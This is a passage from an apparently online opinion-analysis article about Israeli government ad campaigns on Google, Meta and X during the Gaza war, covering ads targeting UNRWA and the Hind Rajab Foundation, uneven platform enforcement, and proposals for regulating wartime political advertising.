    &lt;p&gt;UNRWA officials, upon learning of the global ads, reiterated that these tactics were “a wider disinformation campaign” by Israel to cripple the agency (abc.net.au). Despite criticism from UN allies (Australia’s Foreign Minister called Israel’s actions “reprehensible” and urged them to stop undermining UNRWA (abc.net.au), the Israeli government showed no signs of relenting. It even escalated measures offline, banning UNRWA operations in Israel, as the online ad offensive continued (abc.net.au)&lt;/p&gt;
    &lt;head rend="h2"&gt;A coordinated ad push against the Hind Rajab Foundation (HRF)&lt;/head&gt;
    &lt;p&gt;Alongside the UNRWA campaign, the Israeli Government Advertising Agency has also targeted the Hind Rajab Foundation (HRF), an EU-based human-rights nonprofit founded in 2024 to pursue accountability for alleged war crimes in Gaza and named in honor of five-year-old Hind Rajab, whose death became emblematic of the conflict (Hind Rajab Foundation). In Google’s Ads Transparency Center, the agency’s account shows creatives such as “Hind Rajab Foundation — HRF’s disturbing reality” that click through to a government microsite titled “Unmasking the Hind Rajab Foundation,” which portrays HRF as a pseudo-legal front with “extremist” ties (Ads Transparency Center, 2025; Government of Israel). Reporting on Israel’s recent $45 million placement with Google further notes that several ads explicitly link to this “Unmasking” report, indicating a coordinated effort to discredit HRF across search and display (Drop Site News). For context, HRF’s public materials frame the organization as a legal accountability initiative, while the story of Hind Rajab has gained global visibility through Kaouther Ben Hania’s Venice-premiering film The Voice of Hind Rajab, backed by high-profile producers including Brad Pitt, Joaquin Phoenix, Rooney Mara, and Jonathan Glazer, which has amplified awareness of the case well beyond activist circles (Reuters).&lt;/p&gt;
    &lt;head rend="h2"&gt;Flooding Social Media with War Narratives&lt;/head&gt;
    &lt;p&gt;The attack on UNRWA was just one facet of Israel’s broader digital PR war. Israeli agencies and allied groups pumped out hundreds of ads across Google/YouTube, Facebook/Instagram, and even children’s gaming apps to influence public opinion about the Gaza conflict. David Saranga, head of the Israeli Foreign Ministry’s digital bureau, confirmed that “the footage is part of a larger advocacy drive” in which the ministry spent $15 million on internet ads in just the first few weeks after October 7, 2023 (smex.org). Those ads often contained graphic and emotional imagery, for example, violent scenes and frightened Israeli families, even appearing as pop-ups in kids’ online games, where they left children “shocked and disturbed” (smex.org). Reuters journalists observed some of these graphic video ads playing in European video games used by children, raising serious questions about appropriateness and consent (business-humanrights.org).&lt;/p&gt;
    &lt;p&gt;On Meta’s platforms (Facebook and Instagram), pro-Israel advertising also spiked dramatically. One effort led by a group calling itself “Facts for Peace” spent over $370,000 on Facebook/Instagram ads in a single month (November 2023) to push viral videos framing all support for Palestine as support for Hamas (business-humanrights.org). These ads, which amassed over 21 million views, were crafted to equate the Palestinian cause with barbaric violence. Despite the obviously misleading and inflammatory nature of such content, it spread widely: it was even promoted by right-wing influencers like Ben Shapiro and shared by official Israeli government social media (e.g. the Israeli embassy in Chile) (business-humanrights.org). Meta’s Ad Library showed 213 ads from Facts for Peace, of which only 3 were taken down for policy violations (business-humanrights.org). Meta told investigators that the campaign did not technically break their rules on transparency, since the ads carried a “Paid for by Facts for Peace” disclaimer and the page was authorized for political advertising. However, nowhere did the group disclose its true funding sources or organizers. (Journalists later linked it to a U.S. billionaire funding pro-Israel messaging (business-humanrights.org.) This case shows how easy it is for a new, opaque group to launch a massive political ad campaign and reach millions before anyone can fully scrutinize it.&lt;/p&gt;
    &lt;p&gt;Israeli government entities themselves also ran extensive campaigns on social media. The Israeli Ministry of Foreign Affairs launched at least 75 distinct ads on YouTube alone in the first months of the war (smex.org). Some of these ads featured what observers called incitement to violence. In one video ad, a menacing message declared: “Israel will take every measure necessary to protect our citizens against these barbaric terrorists,” which borders on a call to collective violence (smex.org). YouTube’s political ads policy forbids content that “encourages others to commit violent acts,” yet this ad apparently slipped through (smex.org). On X (formerly Twitter), the Israeli government and military accounts also placed promoted posts with graphic images (e.g. charred buildings and victims), urging support for their military actions (smex.org). Such ads would seem to violate X’s pre-existing ban on state-affiliated media buying ads (a policy originally aimed at propaganda from outlets like Russia’s RT). Nonetheless, these promotions ran, and some critics questioned if Elon Musk’s open support for Israel influenced X’s lax enforcement (smex.org).&lt;/p&gt;
    &lt;p&gt;By early 2025, reports revealed that Israel had even formalized a multi-million dollar contract with Google to sustain its global propaganda offensive. According to investigative reporting by Drop Site News (and cited by outlets like TRT World), the Israeli Prime Minister’s Office signed a $45 million, six-month deal with Google in June 2025 to run a worldwide advertising blitz downplaying the humanitarian crisis in Gaza (trtworld.com). The campaign kicked off just after Israeli authorities imposed a siege cutting off food, fuel, and medicine to Gaza in March 2025, and as officials worried about “the public relations fallout”. Leaked documents described Google as a “key entity” in Netanyahu’s PR strategy (trtworld.com). Sure enough, soon after, YouTube and display ads proclaiming “there is food in Gaza. Any other claim is a lie” flooded the internet, with one such video, produced by Israel’s Foreign Ministry, racking up over 6 million views via paid promotion (trtworld.com). In effect, Google was being directly paid to broadcast the message that reports of starvation in Gaza were false, despite widespread documentation of severe hunger by the UN and NGOs. Israeli propaganda officials openly characterized these efforts as “hasbara” — literally “propaganda” — in internal communications (trtworld.com). Alongside Google, Israel spent another $3 million on ads on X (Twitter) and $2.1 million on other ad networks to bolster its narrative (trtworld.com).&lt;/p&gt;
    &lt;p&gt;The impact of Israel’s ad campaign is hard to quantify, but it undoubtedly reached broad swathes of the global public with the government’s perspective. By framing its military operations as justified self-defense and its critics (even humanitarian agencies) as terrorist sympathizers, Israel’s paid ads sought to shore up international support and neutralize opposition. Given that Israel’s security and billions in military aid depend on Western public opinion (smex.org), this digital influence strategy was a logical extension of the war itself. However, it came at the cost of injecting misinformation and extreme bias into the information ecosystem, potentially skewing public perceptions and policy debates. As we’ll see next, this case also exposes worrying gaps in platform policies and ethical oversight.&lt;/p&gt;
    &lt;head rend="h2"&gt;Policy Gaps, Double Standards, and Ethical Dilemmas&lt;/head&gt;
    &lt;p&gt;The use of paid ads for propaganda raises a blunt question: Are Google and Meta actually enforcing their own rules when it comes to wartime disinformation? The evidence from the above case suggests significant gaps and inconsistencies. Despite formal policies against harmful or misleading content, both companies’ systems enabled, and profited from, campaigns that arguably violate the spirit, if not the letter, of those rules.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Google’s laissez-faire approach to misinformation: Google’s advertising policies forbid certain categories of content (hate speech, explicit incitement to violence, etc.) and ban misrepresenting who you are. But they do not outright ban false or misleading claims in ads except in narrow contexts like election integrity or COVID-19 info (gomixte.com). This is why blatant propaganda, e.g. accusing a UN agency of abetting terror with scant evidence, can pass muster on Google Ads. Google relied on users or affected parties to report problematic ads, and stated it would “take swift action” if actual policy violations were found (wired.com). But in practice, Google did not pro-actively vet the truth of Israeli government claims. The company was, after all, in a business relationship with Israel (not to mention the formal $45M deal) and may have been reluctant to police a powerful client’s messaging beyond basic checks. This hands-off stance highlights a moral gray area: allowing a paying customer to spread potentially dangerous misinformation because it doesn’t fit neatly into a prohibited category. It suggests that platform policy enforcement can be very literal and reactive, leaving ethical judgment by the wayside.&lt;/item&gt;
      &lt;item&gt;Meta’s inconsistent enforcement and transparency issues: Facebook/Meta, on paper, has more expansive rules for political ads. They require identity verification for political advertisers and mandate a “Paid for by [Name]” disclosure on each ad. Certain types of violent or hateful content are disallowed even in ads. In the Israel–Gaza context, however, these rules were enforced unevenly. Meta’s own Ads Library data shows a bias: when ads violated policies (e.g. contained hate speech or graphic violence), pro-Palestinian ads were taken down faster and more frequently than pro-Israeli ads (smex.org). SMEX’s analysis of thousands of ads found that Israeli war-cheerleading ads often remained live longer despite breaking rules, whereas ads calling for Gaza humanitarian aid got removed with stricter urgency (smex.org). For example, the “Facts for Peace” videos that implied all Palestinian supporters endorse terror arguably constituted hateful generalization, yet most stayed up until their paid run ended. Meanwhile, at least one civil society test in late 2023 found that Facebook approved ads containing explicit hate speech calling for violence against Palestinians, indicating failures in the automated moderation system (business-humanrights.org). Meta responded that it prioritizes transparency — pointing to the existence of the Ad Library — but researchers found the library frustratingly opaque. Some ads that clearly ran were missing from public search, and crucial data like why an ad was removed or who exactly was targeted were absent (smex.org). Meta shut down useful tools like CrowdTangle (which helped monitor content virality) in 2024, hampering independent oversight (smex.org). All of this suggests that Meta’s professed neutrality masks a deeply flawed system, where enforcement can be influenced by political sensitivities or errors, and where the company’s profit motive in selling ads may conflict with taking decisive action against harmful content.&lt;/item&gt;
      &lt;item&gt;Double standards for different conflicts: A striking contrast can be seen in how platforms treated Russian state propaganda versus Israeli state propaganda. During Russia’s 2022 invasion of Ukraine, Western tech firms took an unusually hard line against Russia’s online influence operations. Meta banned Russian state media outlets from running ads or monetizing content on its platform and demoted their posts (smex.org). It also aggressively labeled or removed Russian disinformation about the war, under heavy pressure from governments and public opinion. Google similarly demonetized Russian state-affiliated channels (like RT) and limited their reach. These steps were lauded as Big Tech taking a stand against wartime disinformation. Yet, when it came to Israel, engaging in similar behavior, the response was far more lenient. No blanket bans or demonetization were applied to Israeli state entities pushing propaganda, even though some of their content arguably violated the same principles (for instance, denying documented human suffering in Gaza, or using dehumanizing language about “barbaric terrorists” broadly). Observers have pointed out this double standard, noting that platforms seemed willing to bend rules or look the other way for a U.S.-aligned government (smex.org). This inconsistency not only undermines the credibility of platform policies but also raises geopolitical questions: are ethical standards being applied universally, or only when convenient?&lt;/item&gt;
      &lt;item&gt;Violations of international norms: Beyond platform rules, there’s an argument that some of these ad campaigns tread on international ethical standards or even laws. For example, deliberately spreading false information to obstruct humanitarian aid (as Israel’s anti-UNRWA ads aimed to do) could be seen as running counter to International Humanitarian Law, which seeks to protect aid efforts and civilians during conflict. Incitement to violence against a population is outlawed under the Genocide Convention and other treaties — and while social media ads we’ve discussed stop short of explicit incitement, they foment hatred and misunderstanding that can fuel violence. The UN Secretary-General and other officials have repeatedly condemned the weaponization of disinformation in conflict settings, calling it “destructive” and urging tech companies to clamp down (wired.com) (aljazeera.com). Allowing a state to pay to propagate one-sided or false narratives undermining a UN agency could be seen as abetting an attack on that international institution’s integrity. These are largely uncharted waters, there’s no clear international law for “information warfare”, but the ethical condemnation is growing. As Lazzarini implored, such campaigns “should stop and be investigated”, and social media firms must do more to combat disinformation and hate speech in war (aljazeera.com).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;All these issues point back to the central dilemma: What responsibility do the tech giants have when their advertising tools are used to spread propaganda or inflame conflicts? If they act as neutral carriers, they risk facilitating harm; if they intervene, they become arbiters of truth in explosive political situations. The next section looks at how Google, Meta, and others have responded, or failed to respond, and what more could be done.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Responsibility of Tech Companies in Wartime Propaganda&lt;/head&gt;
    &lt;p&gt;Major tech companies often insist they are platforms, not publishers, they provide the space, but aren’t responsible for every message that advertisers choose to push. However, the extreme examples we’ve explored put that claim to the test. When a company is paid millions to disseminate content that may be false or harmful, can it really wash its hands of accountability? Here are some considerations and responses from the companies and experts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Official stances and defenses: Google’s official line, as noted, is that it applies its ad policies equally to all, including governments, and will remove ads that violate those policies (wired.com). Implicit in that statement is that Google does not see itself as the arbiter of factual truth in ads, unless a lie crosses certain predefined lines, Google will host it for a paying client. Meta, for its part, touts the transparency of its system. A Meta spokesperson, responding to concerns about the “Facts for Peace” campaign, emphasized that the ads were “clearly labeled with a ‘paid by’ disclaimer” and publicly archived in the Ads Library, implying that this level of transparency exceeds that of TV or print political ads (business-humanrights.org). Meta also points out that it has an Ad Standards enforcement team and that ads violating policies (when caught) are taken down and documented. In practice, as we saw, that enforcement can lag or falter — but the company’s message is that shining light on ads is the solution, rather than heavy-handed censorship.&lt;/item&gt;
      &lt;item&gt;Profit vs. principle: Critics argue that a big reason these platforms struggle to self-regulate is that they make money from every ad impression. When conflict-related content goes viral, ad spending surges. A joint analysis by CalMatters and The Markup found that after war broke out in Gaza on Oct 7, 2023, Meta saw a major increase in ad revenue related to the conflict (calmatters.org). In October 2023 alone, an estimated $3.1 million was spent on Facebook ads about the Israel–Gaza war, a huge spike compared to previous months (calmatters.org). This includes not just state propaganda but also ads for fundraising, merchandise, and advocacy around the crisis. The point is that war and political violence can become lucrative business for social media companies, something Meta’s own employees have acknowledged internally (Facebook famously admitted that outrage and misinformation drive engagement, which in turn drives ad revenue (calmatters.org). This profit motive can create a perverse disincentive to crack down on borderline content. While $3 million is a drop in the bucket of Meta’s $100+ billion annual revenue, it’s still revenue. And for Google, a $45 million contract from Israel’s government is significant. The companies risk accusations of “conflict profiteering” if they appear to take money to propagate one side’s propaganda. This has led to calls for them to refuse or refund ad buys that clearly aim to deceive or stoke conflict, though such moves remain rare.&lt;/item&gt;
      &lt;item&gt;Calls for stronger policies: Human rights organizations and digital rights groups are urging the platforms to develop special policies for ads in conflict zones or on politically sensitive issues. For instance, SMEX and others have suggested that in the context of an armed conflict, platforms should implement tailored rules to prevent the spread of hate speech and misinformation via ads, given the real-world stakes (smex.org). Concretely, this could mean temporarily banning state-run or state-funded advertising in active conflict situations, or at least subjecting them to human review and fact-checking. It could also mean disallowing ads that target foreign populations with war propaganda, treating it akin to foreign election interference. Another idea floated by experts is a “circuit breaker” approach: if a sudden war or crisis erupts, platforms might pause all political and issue-based ads in the affected regions until they can ramp up oversight. (Notably, Meta has recently decided to halt all political, electoral, and social issue ads in the entire EU starting in 2025, in response to new regulations (about.fb.com). This broad-brush ban is a compliance move for Europe, but it shows that turning off political ads is technically feasible when mandated.)&lt;/item&gt;
      &lt;item&gt;Transparency and researcher access: Many observers argue that if companies won’t ban propaganda ads outright, they should at least empower watchdogs to track and expose them. This means improving their ad transparency tools. Meta’s shutting down of CrowdTangle and the limitations of the Ads Library have drawn heavy criticism (smex.orgsmex.org). Experts like Sam Jeffers of Who Targets Me advocate for more robust disclosures — for example, revealing detailed targeting parameters of political ads (so we know who governments are trying to influence) and keeping archives of removed ads including why they were removed (business-humanrights.org) (smex.org). There are also calls for independent audits of platform algorithms and ad delivery, to see if certain viewpoints are getting amplified unfairly. Ultimately, greater transparency can help civil society and journalists “police” the propaganda if the platforms themselves are slow to do so.&lt;/item&gt;
      &lt;item&gt;Regulatory pressure and international standards: Governments and international bodies are starting to weigh in. The European Union’s Digital Services Act (DSA) and upcoming regulations on political advertising put legal requirements on big platforms to prevent misuse. For example, the DSA requires rapid removal of illegal content (which could include illegal hate speech or incitement in ads) and hefty fines for non-compliance. The EU is also pushing for strict transparency on political ads and even contemplating banning microtargeting for political messages. These rules, though EU-specific, often end up being adopted globally by platforms for simplicity’s sake. Outside of Europe, the lack of regulation has been evident, which is why UN officials like Lazzarini are directly calling for “more regulations for companies… to combat disinformation and hate speech” online (aljazeera.com). We may see moves in the UN or other international forums to establish norms against certain propaganda techniques. In the long run, if self-regulation fails, tech companies might face binding rules prohibiting them from accepting money for ads that undermine peace and truth, a challenging rule to draft, but an increasingly pertinent conversation.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;The era of governments weaponizing Google and Facebook ads is upon us, raising thorny questions about truth, free speech, and corporate responsibility in the digital age. The case of Israel’s advertising blitz in the Gaza war demonstrates how easily paid platforms can be turned into tools of war propaganda, blasting millions with biased or false narratives at the click of a button. It also shows the real harms at stake: humanitarian aid blocked, democratic institutions undermined, and public discourse polluted. And Israel is not alone, from superpowers to militant groups, many actors have tested the boundaries of online ads to sway hearts and minds.&lt;/p&gt;
    &lt;p&gt;For the platforms, this is a moment of reckoning. Can Google and Meta continue to say “we’re just the middleman” while cashing checks for propaganda campaigns? Critics argue that neutrality is not neutral when it enables deception and violence. Yet, deciding where to draw the line is complex. Mistakes or overreach in moderation could themselves be seen as partisan interference. The tightrope between allowing robust political advocacy and preventing harmful propaganda is a difficult one to walk, especially under global scrutiny.&lt;/p&gt;
    &lt;p&gt;What is clear is that doing nothing is no longer tenable. Sunlight and accountability are the minimum: users deserve to know who is behind the political ads they see and to have confidence that egregious lies or incitements won’t be promoted by the world’s most powerful information platforms. Moving forward, it will likely require a mix of solutions , improved self-governance by tech firms, independent oversight, and smart regulation, to ensure that the tools of modern advertising are not abused to foment conflict or erode democracy. As the saying goes, “In war, truth is the first casualty.” In our digital world, we must decide how much we are willing to let paid algorithms hasten that casualty, or whether we can find ways to uphold truth even amid the fog of online war.&lt;/p&gt;
